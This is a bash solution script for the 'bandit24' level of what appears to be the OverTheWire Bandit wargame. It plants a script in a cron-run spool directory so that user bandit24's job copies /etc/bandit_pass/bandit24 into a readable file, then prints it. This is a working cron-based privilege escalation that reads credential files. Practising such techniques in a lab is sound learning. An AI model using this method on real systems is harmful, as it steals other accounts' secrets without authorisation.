# Fun times... a script to write a script.

# all scripts here will be executed and deleted
target_dir="/var/spool/bandit24/foo"

# this is where we are going to work. I am not too familiar on how linux handles things,
# but I don't wanna write a script directly to target and have it execute halfway through
# me writing it. Even if there's no risk of that happening, there's still a risk of trying to set
# perms on something after it disappears from under my nose.
tempdir="$(mktemp -d)"
chmod a+rwx "$tempdir"

# user bandit24 is going to automatically execute this script in the next minute
cat > "$tempdir/gotcha.sh" << EOF
#!/bin/bash
cat /etc/bandit_pass/bandit24 > $tempdir/treasure
chmod a+rw $tempdir/treasure
EOF

chmod a+rwx "$tempdir/gotcha.sh"
mv "$tempdir/gotcha.sh" "$target_dir/gotcha.sh"

# I know polling is generally a bad idea but it's what I would do manually.
while [ ! -e $tempdir/treasure ] ; do
    sleep 1
done

# by now there's no way it doesn't exist and we don't have access to it
cat $tempdir/treasure
